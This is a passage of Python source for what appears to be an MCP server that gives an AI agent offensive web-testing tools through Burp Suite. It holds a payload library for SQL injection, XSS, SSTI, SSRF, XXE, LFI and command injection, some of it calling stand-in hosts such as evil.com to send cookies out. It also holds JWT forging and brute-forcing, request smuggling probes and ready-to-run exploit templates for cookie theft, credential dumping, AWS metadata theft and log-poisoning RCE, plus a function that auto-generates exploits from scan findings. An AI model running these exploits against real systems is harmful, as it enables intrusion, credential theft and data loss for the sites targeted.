    return _burp_post("set_proxy_intercept_state", {"enabled": enabled})

# ── Scanner ───────────────────────────────────────────────────────────────────

@mcp.tool()
def burp_active_scan(url: str, insertion_points: list[str] = None) -> Any:
    """Launch Burp active scan against URL."""
    data = {"url": url}
    if insertion_points:
        data["insertionPoints"] = insertion_points
    return _burp_post("scan", data)

@mcp.tool()
def burp_get_scan_status(scan_id: str = "") -> Any:
    """Get Burp scan status."""
    return _burp_get("scan" + (f"/{scan_id}" if scan_id else ""))

@mcp.tool()
def burp_cancel_scan(scan_id: str) -> Any:
    """Cancel a Burp scan."""
    return _burp_post(f"scan/{scan_id}/cancel", {})

@mcp.tool()
def burp_passive_scan(request: str, response: str = "") -> Any:
    """Submit request/response to Burp passive scanner."""
    return _burp_post("passive_scan", {"request": request, "response": response})

@mcp.tool()
def get_scanner_issues(severity: str = "", url: str = "") -> Any:
    """Get Burp scanner issues, optionally filtered by severity or URL."""
    p = {}
    if severity: p["severity"] = severity
    if url:      p["url"]      = url
    return _burp_get("get_scanner_issues", p)

# ── Repeater / Intruder ───────────────────────────────────────────────────────

@mcp.tool()
def send_http1_request(request: str, host: str = "",
                        port: int = 80, use_https: bool = False) -> Any:
    """Send HTTP/1.1 request via Burp and return response."""
    return _burp_post("send_http1_request",
                      {"request": request, "host": host,
                       "port": port, "useHttps": use_https})

@mcp.tool()
def send_http2_request(request: str, host: str = "", port: int = 443) -> Any:
    """Send HTTP/2 request via Burp."""
    return _burp_post("send_http2_request",
                      {"request": request, "host": host, "port": port})

@mcp.tool()
def create_repeater_tab(request: str, tab_name: str = "") -> Any:
    """Create Burp Repeater tab."""
    return _burp_post("create_repeater_tab",
                      {"request": request, "tabName": tab_name})

@mcp.tool()
def send_to_intruder(request: str, tab_name: str = "") -> Any:
    """Send request to Burp Intruder."""
    return _burp_post("send_to_intruder",
                      {"request": request, "tabName": tab_name})

# ── Collaborator ──────────────────────────────────────────────────────────────

@mcp.tool()
def generate_collaborator_payload() -> Any:
    """Generate Burp Collaborator OOB payload."""
    return _burp_get("generate_collaborator_payload")

@mcp.tool()
def get_collaborator_interactions(payload_id: str = "") -> Any:
    """Poll Burp Collaborator for OOB interactions."""
    p = {"payloadId": payload_id} if payload_id else {}
    return _burp_get("get_collaborator_interactions", p)

# ── Config ────────────────────────────────────────────────────────────────────

@mcp.tool()
def output_project_options() -> Any:
    """Get Burp project configuration."""
    return _burp_get("output_project_options")

@mcp.tool()
def output_user_options() -> Any:
    """Get Burp user configuration."""
    return _burp_get("output_user_options")

@mcp.tool()
def set_project_options(options_json: str) -> Any:
    """Set Burp project options (JSON string)."""
    try:    data = json.loads(options_json)
    except: return {"error": "Invalid JSON"}
    return _burp_post("set_project_options", data)

@mcp.tool()
def set_user_options(options_json: str) -> Any:
    """Set Burp user options (JSON string)."""
    try:    data = json.loads(options_json)
    except: return {"error": "Invalid JSON"}
    return _burp_post("set_user_options", data)

@mcp.tool()
def set_task_execution_engine_state(paused: bool) -> Any:
    """Pause/unpause Burp task execution engine."""
    return _burp_post("set_task_execution_engine_state", {"paused": paused})

@mcp.tool()
def get_active_editor_contents() -> Any:
    """Get active Burp message editor contents."""
    return _burp_get("get_active_editor_contents")

@mcp.tool()
def set_active_editor_contents(content: str) -> Any:
    """Set active Burp message editor contents."""
    return _burp_post("set_active_editor_contents", raw=content)


# ═════════════════════════════════════════════════════════════════════════════
# ── LAYER 3: PURE PYTHON SECURITY TOOLS ─────────────────────────────────────
# ═════════════════════════════════════════════════════════════════════════════

# ── Payload library ───────────────────────────────────────────────────────────

_PAYLOADS = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
        "'; DROP TABLE users--", "1' ORDER BY 1--", "1' ORDER BY 2--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "1 AND SLEEP(5)--", "1' AND SLEEP(5)--",
        "1; WAITFOR DELAY '0:0:5'--",
        "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<script>fetch('https://evil.com?c='+document.cookie)</script>",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{config}}", "{{self.__dict__}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "ssrf": [
        "http://127.0.0.1/", "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://[::1]/", "http://0.0.0.0/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd", "file:///etc/shadow",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO%0d%0a",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo/>',
    ],
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "..%2fetc%2fpasswd", "..%252fetc%252fpasswd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "/proc/self/environ", "/proc/self/fd/0",
        "..\\..\\windows\\win.ini", "c:\\windows\\win.ini",
    ],
    "cmd_injection": [
        "; id", "| id", "& id", "`id`", "$(id)",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "; ping -c 1 attacker.com", "$(ping -c 1 attacker.com)",
        "\n id", "%0a id", "1; sleep 5", "1 | sleep 5",
    ],
    "open_redirect": [
        "//evil.com", "///evil.com", "https://evil.com",
        "//evil.com/%2F..", "/%09/evil.com",
        "javascript:alert(1)", "//google.com@evil.com",
        "/\\evil.com", "%2F%2Fevil.com",
    ],
}

@mcp.tool()
def get_payloads(payload_type: str) -> dict:
    """
    Get attack payloads for a vulnerability class.
    payload_type: sqli | xss | ssti | ssrf | xxe | lfi | cmd_injection | open_redirect
    """
    pt = payload_type.lower().strip()
    if pt not in _PAYLOADS:
        return {"error": f"Unknown type '{pt}'", "available": list(_PAYLOADS.keys())}
    return {"type": pt, "count": len(_PAYLOADS[pt]), "payloads": _PAYLOADS[pt]}

@mcp.tool()
def get_all_payload_types() -> list[str]:
    """List all available payload types."""
    return list(_PAYLOADS.keys())

# ── JWT Tools ─────────────────────────────────────────────────────────────────

@mcp.tool()
def jwt_decode(token: str) -> dict:
    """Decode a JWT token (no verification). Returns header, payload, warnings."""
    parts = token.split(".")
    if len(parts) < 2:
        return {"error": "Not a valid JWT"}

    def _b64d(s):
        s += "=" * (4 - len(s) % 4)
        try:    return json.loads(base64.urlsafe_b64decode(s))
        except: return {"raw": s}

    header, payload = _b64d(parts[0]), _b64d(parts[1])
    alg = header.get("alg", "")
    warnings = []
    if alg.upper() == "NONE":
        warnings.append("Algorithm is 'none' — NO SIGNATURE")
    if alg.upper() == "HS256":
        warnings.append("HS256 — brute-forceable if weak secret")
    if "exp" in payload:
        import datetime
        exp_dt = datetime.datetime.utcfromtimestamp(payload["exp"])
        if exp_dt < datetime.datetime.utcnow():
            warnings.append(f"Token EXPIRED at {exp_dt.isoformat()}")
    return {"header": header, "payload": payload, "algorithm": alg, "warnings": warnings}

@mcp.tool()
def jwt_forge_none_alg(token: str) -> dict:
    """JWT 'alg:none' attack — strips signature and sets alg to none."""
    parts = token.split(".")
    if len(parts) < 2:
        return {"error": "Not a valid JWT"}
    def _b64d(s):
        s += "=" * (4 - len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s))
    def _b64e(obj):
        return base64.urlsafe_b64encode(
            json.dumps(obj, separators=(',', ':')).encode()
        ).rstrip(b"=").decode()
    header, payload = _b64d(parts[0]), _b64d(parts[1])
    forged = []
    for alg_val in ["none", "None", "NONE", "nOnE"]:
        h = dict(header); h["alg"] = alg_val
        forged.append({"alg_used": alg_val, "token": f"{_b64e(h)}.{_b64e(payload)}."})
    return {"original_alg": header.get("alg"), "forged_tokens": forged}

@mcp.tool()
def jwt_brute_secret(token: str, wordlist_path: str = "") -> dict:
    """Brute-force a JWT HS256 secret using common secrets + optional wordlist."""
    parts = token.split(".")
    if len(parts) != 3:
        return {"error": "Need full JWT with 3 parts"}
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    sig_bytes = base64.urlsafe_b64decode(parts[2] + "==")
    candidates = [
        "secret", "password", "123456", "qwerty", "admin", "letmein",
        "changeme", "default", "jwt_secret", "supersecret", "key", "token",
        "", "null", "your-256-bit-secret", "your-secret-key",
    ]
    if wordlist_path:
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                candidates += [l.strip() for l in f if l.strip()]
        except Exception as e:
            return {"error": str(e)}
    for secret in candidates:
        try:
            expected = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(expected, sig_bytes):
                return {"found": True, "secret": secret}
        except Exception:
            continue
    return {"found": False, "checked": len(candidates)}

# ── CORS / Host Header / Smuggling ────────────────────────────────────────────

@mcp.tool()
def test_cors_misconfiguration(url: str, auth_header: str = "") -> dict:
    """Test CORS policy for misconfigurations."""
    test_origins = [
        "https://evil.com", "null",
        f"https://{urllib.parse.urlparse(url).netloc}.evil.com",
        "http://localhost", "https://127.0.0.1",
    ]
    findings = []
    for origin in test_origins:
        try:
            hdrs = {"Origin": origin}
            if auth_header: hdrs["Authorization"] = auth_header
            r = requests.get(url, headers=hdrs, timeout=10)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == origin and acac.lower() == "true":
                findings.append({"origin": origin, "acao": acao,
                                  "credentials": acac, "risk": "CRITICAL"})
            elif acao == origin:
                findings.append({"origin": origin, "acao": acao, "risk": "MEDIUM"})
        except Exception as e:
            findings.append({"origin": origin, "error": str(e)})
    return {"url": url, "vulnerable": bool(findings), "findings": findings}

@mcp.tool()
def test_host_header_injection(url: str, collaborator_host: str = "") -> dict:
    """Test for Host header injection vulnerabilities."""
    oob_host = collaborator_host
    collab_id = None
    if not oob_host:
        try:
            c = _burp_get("generate_collaborator_payload")
            if isinstance(c, dict):
                oob_host = c.get("payload", "attacker.example.com")
                collab_id = c.get("payloadId")
        except Exception:
            oob_host = "attacker.example.com"
    results = []
    for hdr_set in [
        {"Host": oob_host},
        {"X-Forwarded-Host": oob_host},
        {"X-Host": oob_host},
        {"Forwarded": f"host={oob_host}"},
    ]:
        try:
            r = requests.get(url, headers=hdr_set, timeout=10, allow_redirects=False)
            results.append({
                "headers_sent": hdr_set,
                "status": r.status_code,
                "reflected": oob_host.lower() in r.text.lower(),
            })
        except Exception as e:
            results.append({"headers_sent": hdr_set, "error": str(e)})
    oob_hits = []
    if collab_id:
        time.sleep(3)
        oob_hits = _burp_get("get_collaborator_interactions", {"payloadId": collab_id})
    return {"url": url, "oob_host": oob_host, "tests": results,
            "oob_interactions": oob_hits,
            "vulnerable": any(r.get("reflected") for r in results) or bool(oob_hits)}

@mcp.tool()
def detect_request_smuggling(host: str, port: int = 443, use_tls: bool = True) -> dict:
    """Detect HTTP request smuggling (CL.TE and TE.CL) via raw sockets."""
    results = {"host": host, "port": port, "tests": []}
    def _raw_send(payload: bytes) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            if use_tls:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)
            s.sendall(payload)
            resp = b""
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            s.close()
            return resp.decode("latin-1", errors="replace")
        except Exception as e:
            return f"[ERROR] {e}"
    # CL.TE
    cl_te = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n"
             "0\r\n\r\nG").encode()
    r1 = _raw_send(cl_te)
    results["tests"].append({"type": "CL.TE",
                              "indicator": "400" in r1 or "Invalid" in r1,
                              "snippet": r1[:300]})
    # TE.CL
    te_cl = (f"POST / HTTP/1.1\r\nHost: {host}\r\n"
             "Content-Type: application/x-www-form-urlencoded\r\n"
             "Content-length: 4\r\nTransfer-Encoding: chunked\r\n"
             "Transfer-encoding: cow\r\n\r\n"
             "5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n").encode()
    r2 = _raw_send(te_cl)
    results["tests"].append({"type": "TE.CL",
                              "indicator": "GPOST" in r2 or "Unrecognized" in r2,
                              "snippet": r2[:300]})
    results["potentially_vulnerable"] = any(t["indicator"] for t in results["tests"])
    return results

# ── Parameter Mining ─────────────────────────────────────────────────────────

@mcp.tool()
def mine_hidden_parameters(url: str, method: str = "GET",
                             custom_params: list[str] = None) -> dict:
    """Discover hidden parameters by testing a wordlist and analysing response changes."""
    wordlist = [
        "id", "user", "username", "email", "password", "token", "key", "api_key",
        "session", "redirect", "url", "next", "file", "path", "page", "action",
        "type", "format", "lang", "q", "search", "query", "cmd", "command",
        "exec", "debug", "admin", "test", "mode", "callback", "jsonp",
        "ref", "source", "target", "dest", "return", "goto", "continue",
        "upload", "download", "import", "export", "backup", "restore",
        "config", "conf", "setting", "option", "flag", "version", "env",
    ] + (custom_params or [])
    try:
        base_r = requests.request(method.upper(), url, timeout=10)
        base_len, base_code = len(base_r.text), base_r.status_code
    except Exception as e:
        return {"error": str(e)}
    interesting = []
    for param in wordlist:
        try:
            kw = {"params": {param: "TEST1337"}} if method.upper() == "GET" \
                 else {"data": {param: "TEST1337"}}
            r = requests.request(method.upper(), url, timeout=8, **kw)
            diff = abs(len(r.text) - base_len)
            if r.status_code != base_code or diff > 50:
                interesting.append({
                    "param": param, "status_diff": r.status_code != base_code,
                    "length_diff": diff, "reflected": "TEST1337" in r.text,
                })
        except Exception:
            continue
    return {"url": url, "tested": len(wordlist), "interesting": interesting}

# ── Session Entropy ───────────────────────────────────────────────────────────

@mcp.tool()
def analyze_session_entropy(tokens: list[str]) -> dict:
    """Analyse session tokens for entropy, sequential patterns, and predictability."""
    if len(tokens) < 2:
        return {"error": "Provide at least 2 tokens"}
    def _entropy(s):
        if not s: return 0.0
        freq = collections.Counter(s)
        n = len(s)
        return -sum((c/n)*math.log2(c/n) for c in freq.values())
    entropies = [_entropy(t) for t in tokens]
    avg_e = sum(entropies) / len(entropies)
    sequential = False
    try:
        nums  = [int(t, 16) for t in tokens]
        diffs = [abs(nums[i+1]-nums[i]) for i in range(len(nums)-1)]
        if len(set(diffs)) == 1:
            sequential = True
    except Exception:
        pass
    issues, verdict = [], "STRONG"
    if avg_e < 3.5:  issues.append("Low entropy"); verdict = "WEAK"
    if sequential:   issues.append("Sequential tokens"); verdict = "CRITICAL"
    return {"tokens_analysed": len(tokens), "avg_entropy": round(avg_e, 3),
            "sequential": sequential, "verdict": verdict, "issues": issues}

# ── SSRF Probe ────────────────────────────────────────────────────────────────

@mcp.tool()
def probe_ssrf(url: str, parameter: str, use_collaborator: bool = True) -> dict:
    """Probe for SSRF via cloud metadata + Burp Collaborator OOB."""
    collab_url, collab_id = "", None
    if use_collaborator:
        try:
            c = _burp_get("generate_collaborator_payload")
            if isinstance(c, dict):
                collab_url = c.get("payload", "")
                collab_id  = c.get("payloadId")
        except Exception:
            pass
    targets = list(_PAYLOADS["ssrf"])
    if collab_url:
        targets = [f"http://{collab_url}", f"https://{collab_url}"] + targets
    results = []
    for ssrf in targets[:12]:
        try:
            r = requests.get(url, params={parameter: ssrf}, timeout=8,
                             allow_redirects=False)
            results.append({"injected": ssrf, "status": r.status_code,
                             "length": len(r.text), "snippet": r.text[:200]})
        except Exception as e:
            results.append({"injected": ssrf, "error": str(e)})
    oob = []
    if collab_id:
        time.sleep(3)
        oob = _burp_get("get_collaborator_interactions", {"payloadId": collab_id})
    return {"url": url, "parameter": parameter, "results": results,
            "oob_interactions": oob, "vulnerable": bool(oob)}

# ── Web Cache Poisoning ───────────────────────────────────────────────────────

@mcp.tool()
def detect_cache_poisoning(url: str) -> dict:
    """Test for web cache poisoning via unkeyed header reflection."""
    unkeyed = {
        "X-Forwarded-Host": "evil.com",
        "X-Forwarded-Scheme": "nothttps",
        "X-Forwarded-Port": "1337",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "X-Host": "evil.com",
    }
    findings = []
    for header, value in unkeyed.items():
        try:
            r = requests.get(url, headers={header: value}, timeout=10)
            if value.lower() in r.text.lower():
                cached = r.headers.get("X-Cache", "") or r.headers.get("CF-Cache-Status", "")
                findings.append({"header": header, "value": value,
                                  "cached": cached, "risk": "HIGH" if cached else "MEDIUM"})
        except Exception:
            continue
    return {"url": url, "findings": findings, "vulnerable": bool(findings)}

# ── OAuth Analysis ────────────────────────────────────────────────────────────

@mcp.tool()
def analyze_oauth_flow(authorization_url: str, redirect_uri: str = "") -> dict:
    """Analyse an OAuth authorization URL for common misconfigurations."""
    parsed = urllib.parse.urlparse(authorization_url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    issues = []
    if params.get("response_type") == "token":
        issues.append("IMPLICIT FLOW — token exposed in URL fragment")
    if not params.get("state"):
        issues.append("Missing 'state' — CSRF possible")
    if not params.get("code_challenge") and params.get("response_type") == "code":
        issues.append("Missing PKCE (code_challenge)")
    redir = params.get("redirect_uri", redirect_uri)
    if redir and not redir.startswith("https://"):
        issues.append(f"redirect_uri is non-HTTPS: {redir}")
    return {"authorization_url": authorization_url, "params": params,
            "issues": issues,
            "risk": "CRITICAL" if any("IMPLICIT" in i for i in issues) else
                    "HIGH" if issues else "LOW"}

# ── GraphQL Tools ─────────────────────────────────────────────────────────────

@mcp.tool()
def graphql_introspect(url: str, headers_json: str = "{}") -> dict:
    """GraphQL introspection — discover full schema, types, queries, mutations."""
    try:    hdrs = json.loads(headers_json)
    except: hdrs = {}
    hdrs.setdefault("Content-Type", "application/json")
    q = '{"query":"{__schema{queryType{name}mutationType{name}types{name kind fields{name}}}}"}'
    try:
        r = requests.post(url, data=q, headers=hdrs, timeout=15)
        data = r.json()
    except Exception as e:
        return {"error": str(e)}
    if "errors" in data:
        return {"error": "Introspection disabled", "details": data["errors"]}
    schema = data.get("data", {}).get("__schema", {})
    user_types = [
        {"name": t["name"], "kind": t["kind"],
         "fields": [f["name"] for f in (t.get("fields") or [])]}
        for t in schema.get("types", [])
        if t["name"] and not t["name"].startswith("__")
    ]
    return {"url": url, "query_type": schema.get("queryType", {}).get("name"),
            "mutation_type": schema.get("mutationType", {}).get("name"),
            "types": user_types, "total_types": len(user_types)}

# ── API / JS Discovery ────────────────────────────────────────────────────────

@mcp.tool()
def discover_api_endpoints_from_js(js_url: str) -> dict:
    """Extract API endpoints, secrets, and external URLs from a JavaScript file."""
    try:
        js = requests.get(js_url, timeout=15).text
    except Exception as e:
        return {"error": str(e)}
    paths = re.findall(r'["\`\'](/[a-zA-Z0-9/_\-\.]{3,80})["\`\']', js)
    api_paths = [p for p in set(paths) if any(
        x in p.lower() for x in ["/api/", "/v1/", "/v2/", "/auth/", "/admin", "/graphql"]
    )]
    secrets = []
    for pat, label in [
        (r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([^"\']{8,})["\']', "API Key"),
        (r'(?i)(secret|token|password)\s*[:=]\s*["\']([^"\']{8,})["\']', "Secret"),
        (r'aws_access_key_id\s*[:=]\s*["\']([A-Z0-9]{20})["\']', "AWS Key"),
    ]:
        for m in re.finditer(pat, js):
            secrets.append({"type": label, "match": m.group(0)[:100]})
    urls = re.findall(r'https?://[a-zA-Z0-9._\-/:%?=&@]{10,120}', js)
    return {"js_url": js_url, "api_endpoints": api_paths[:50],
            "secrets": secrets, "external_urls": list(set(urls))[:30]}

# ── Subdomain Enumeration ─────────────────────────────────────────────────────

@mcp.tool()
def enumerate_subdomains(domain: str, resolve_dns: bool = True) -> dict:
    """Enumerate subdomains via crt.sh certificate transparency + DNS resolution."""
    url  = CRTSH_URL.format(urllib.parse.quote(f"%.{domain}"))
    data = _ext_get(url, timeout=30)
    subs = set()
    if isinstance(data, list):
        for e in data:
            for sub in e.get("name_value", "").splitlines():
                sub = sub.strip().lstrip("*.")
                if sub.endswith(domain):
                    subs.add(sub)
    resolved = {}
    if resolve_dns:
        for sub in list(subs)[:50]:
            try:    resolved[sub] = socket.gethostbyname(sub)
            except: resolved[sub] = "unresolvable"
    return {"domain": domain, "total": len(subs),
            "subdomains": sorted(subs), "resolved": resolved}

# ── CVE / Advisory Intel ─────────────────────────────────────────────────────

@mcp.tool()
def lookup_cve(cve_id: str) -> dict:
    """Look up a CVE from NVD and return full details + CVSS score."""
    data = _ext_get(NVD_API_URL, {"cveId": cve_id})
    if isinstance(data, dict) and "vulnerabilities" in data:
        vulns = data["vulnerabilities"]
        if not vulns:
            return {"error": f"Not found: {cve_id}"}
        cve = vulns[0]["cve"]
        desc = next((d["value"] for d in cve.get("descriptions", [])
                     if d.get("lang") == "en"), "")
        metrics = cve.get("metrics", {})
        cvss = None
        for k in ("cvssMetricV31", "cvssMetricV30"):
            if k in metrics:
                cvss = metrics[k][0]["cvssData"]
                break
        return {"id": cve_id, "description": desc, "cvss_v3": cvss,
                "published": cve.get("published"),
                "references": [r["url"] for r in cve.get("references", [])[:10]]}
    return {"raw": str(data)[:500]}

@mcp.tool()
def search_cve_by_keyword(keyword: str, limit: int = 10) -> dict:
    """Search NVD for CVEs matching a keyword."""
    data = _ext_get(NVD_API_URL, {"keywordSearch": keyword, "resultsPerPage": limit})
    if isinstance(data, dict) and "vulnerabilities" in data:
        out = []
        for v in data["vulnerabilities"]:
            cve  = v["cve"]
            desc = next((d["value"] for d in cve.get("descriptions", [])
                         if d.get("lang") == "en"), "")
            out.append({"id": cve["id"], "description": desc[:200],
                        "published": cve.get("published")})
        return {"results": out, "total": data.get("totalResults", 0)}
    return {"raw": str(data)[:500]}

@mcp.tool()
def tech_to_cves(tech_name: str, version: str = "") -> dict:
    """Map a detected technology + version to known CVEs."""
    return search_cve_by_keyword(f"{tech_name} {version}".strip(), limit=15)

@mcp.tool()
def github_advisory_search(ecosystem: str = "", severity: str = "",
                            keyword: str = "") -> dict:
    """Search GitHub Security Advisories by ecosystem, severity, or keyword."""
    params = {"per_page": 20}
    if ecosystem: params["ecosystem"] = ecosystem
    if severity:  params["severity"]  = severity
    if keyword:   params["query"]     = keyword
    data = _ext_get(GITHUB_ADV, params, {"Accept": "application/vnd.github+json"})
    if isinstance(data, list):
        return {"count": len(data), "advisories": [
            {"ghsa_id": a.get("ghsa_id"), "summary": a.get("summary"),
             "severity": a.get("severity"), "cve_id": a.get("cve_id"),
             "url": a.get("html_url")} for a in data
        ]}
    return {"raw": str(data)[:500]}

@mcp.tool()
def github_repo_secret_scan(owner: str, repo: str, github_token: str = "") -> dict:
    """Scan a GitHub repo's recent commits for exposed secrets and credentials."""
    hdrs = {"Accept": "application/vnd.github+json"}
    if github_token:
        hdrs["Authorization"] = f"token {github_token}"
    PATTERNS = [
        (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "API Key"),
        (r"(?i)(secret[_-]?key)\s*[:=]\s*['\"]?([A-Za-z0-9_\-]{20,})", "Secret Key"),
        (r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", "Private Key"),
        (r"(?i)aws_access_key_id\s*=\s*([A-Z0-9]{20})", "AWS Key"),
        (r"(?i)sk-[A-Za-z0-9]{48}", "OpenAI Key"),
        (r"(?i)ghp_[A-Za-z0-9]{36}", "GitHub Token"),
    ]
    commits = _ext_get(f"https://api.github.com/repos/{owner}/{repo}/commits",
                        {"per_page": 10}, hdrs)
    if not isinstance(commits, list):
        return {"error": "Cannot fetch commits"}
    findings = []
    for commit in commits[:5]:
        sha  = commit.get("sha", "")
        diff = _ext_get(f"https://api.github.com/repos/{owner}/{repo}/commits/{sha}", {}, hdrs)
        if not isinstance(diff, dict):
            continue
        for fi in diff.get("files", []):
            patch, fname = fi.get("patch", ""), fi.get("filename", "")
            for pat, label in PATTERNS:
                for m in re.finditer(pat, patch):
                    findings.append({"type": label, "file": fname,
                                     "commit": sha[:10], "match": m.group(0)[:100]})
    return {"repo": f"{owner}/{repo}", "commits_checked": len(commits[:5]),
            "findings": findings, "total": len(findings)}

# ── Exploit Templates ─────────────────────────────────────────────────────────

_EXPLOIT_TEMPLATES = {
    "sqli_union": '''#!/usr/bin/env python3
# SQLi UNION SELECT exploit
import requests
TARGET = "{url}"
PARAM  = "{param}"

# Confirm columns
for n in range(1, 10):
    nulls = ",".join(["NULL"]*n)
    r = requests.get(TARGET, params={{PARAM: f"' UNION SELECT {{nulls}}-- -"}})
    if r.status_code == 200:
        print(f"[+] {{n}} columns")
        break

# Dump creds
r = requests.get(TARGET, params={{PARAM: "' UNION SELECT username,password,NULL FROM users-- -"}})
print(r.text[:1000])
''',
    "xss_steal_cookies": '''#!/usr/bin/env python3
# XSS Cookie Stealer
import requests, http.server, threading, urllib.parse
TARGET = "{url}"; PARAM = "{param}"; PORT = 8080
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("[STOLEN]", urllib.parse.unquote(self.path)); self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
threading.Thread(target=lambda: http.server.HTTPServer(("",PORT),H).serve_forever(), daemon=True).start()
PAYLOAD = f\'<img src=x onerror="fetch(\'http://127.0.0.1:{{PORT}}/?c=\'+btoa(document.cookie))">\'
requests.get(TARGET, params={{PARAM: PAYLOAD}})
print("[*] Waiting for hits..."); import time; time.sleep(60)
''',
    "ssrf_aws": '''#!/usr/bin/env python3
# SSRF -> AWS Metadata
import requests
TARGET = "{url}"; PARAM = "{param}"
for ep in ["http://169.254.169.254/latest/meta-data/",
           "http://169.254.169.254/latest/meta-data/iam/security-credentials/"]:
    r = requests.get(TARGET, params={{PARAM: ep}}, timeout=10)
    print(f"[*] {{ep}}\\n{{r.text[:500]}}\\n")
''',
    "lfi_log_poison": '''#!/usr/bin/env python3
# LFI -> Log Poisoning RCE
import requests
TARGET = "{url}"; PARAM = "{param}"; LOG = "/var/log/apache2/access.log"
requests.get(TARGET, headers={{"User-Agent": "<?php system($_GET[\\'cmd\\']); ?>"}})
for cmd in ["id", "whoami", "cat /etc/passwd"]:
    r = requests.get(TARGET, params={{PARAM: f"../../../../..{{LOG}}", "cmd": cmd}})
    print(f"[+] {{cmd}}: {{r.text[:200]}}")
''',
    "rce_command_injection": '''#!/usr/bin/env python3
# Command Injection RCE
import requests
TARGET = "{url}"; PARAM = "{param}"
for payload in ["; id", "| id", "`id`", "$(id)", "; cat /etc/passwd"]:
    r = requests.get(TARGET, params={{PARAM: payload}}, timeout=10)
    if "root" in r.text or "uid=" in r.text:
        print(f"[RCE CONFIRMED] payload={{payload!r}}\\n{{r.text[:300]}}")
        break
''',
}

@mcp.tool()
def generate_exploit_template(vuln_type: str, url: str,
                                param: str = "q") -> dict:
    """
    Generate a ready-to-run Python exploit script.
    vuln_type: sqli_union | xss_steal_cookies | ssrf_aws | lfi_log_poison | rce_command_injection
    """
    template = _EXPLOIT_TEMPLATES.get(vuln_type)
    if not template:
        return {"error": f"Unknown type: {vuln_type}",
                "available": list(_EXPLOIT_TEMPLATES.keys())}
    script  = template.format(url=url, param=param)
    outfile = OUTPUT_DIR / f"exploit_{vuln_type}_{int(time.time())}.py"
    try: outfile.write_text(script)
    except: pass
    return {"vuln_type": vuln_type, "url": url, "param": param,
            "script": script, "saved_to": str(outfile),
            "run_with": f"python3 {outfile}"}

@mcp.tool()
def auto_exploit_from_scan(min_severity: str = "high") -> dict:
    """Pull Burp scanner issues and auto-generate exploit templates for each finding."""
    sev_order = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}
    min_sev   = sev_order.get(min_severity.lower(), 3)
    issues    = get_scanner_issues()
    if not isinstance(issues, list):
        return {"error": "Could not retrieve issues"}
    exploits  = []
    vuln_map  = {
        "sql injection": "sqli_union", "cross-site": "xss_steal_cookies",
        "ssrf":          "ssrf_aws",   "file path":  "lfi_log_poison",
        "command":       "rce_command_injection",
    }
    for issue in issues:
        if sev_order.get(issue.get("severity","").lower(), 0) < min_sev:
            continue
        name = issue.get("issueName", "").lower()
        key  = next((v for k, v in vuln_map.items() if k in name), None)
        if key:
            exploits.append({
                "issue": issue.get("issueName"),
                "severity": issue.get("severity"),
                "url": issue.get("url"),
                "exploit": generate_exploit_template(key, issue.get("url",""), "q"),
            })
    return {"total_issues": len(issues), "exploits_generated": len(exploits),
            "exploits": exploits}

# ── Intruder Automation ───────────────────────────────────────────────────────

@mcp.tool()
def build_intruder_attack(request_template: str, payload_type: str,
                           attack_mode: str = "sniper",
                           marker: str = "§FUZZ§") -> dict:
    """
    Auto-build and launch a Burp Intruder attack with generated payloads.
    attack_mode: sniper | pitchfork | cluster_bomb
    """
    payloads = _PAYLOADS.get(payload_type.lower(), [])
    if not payloads:
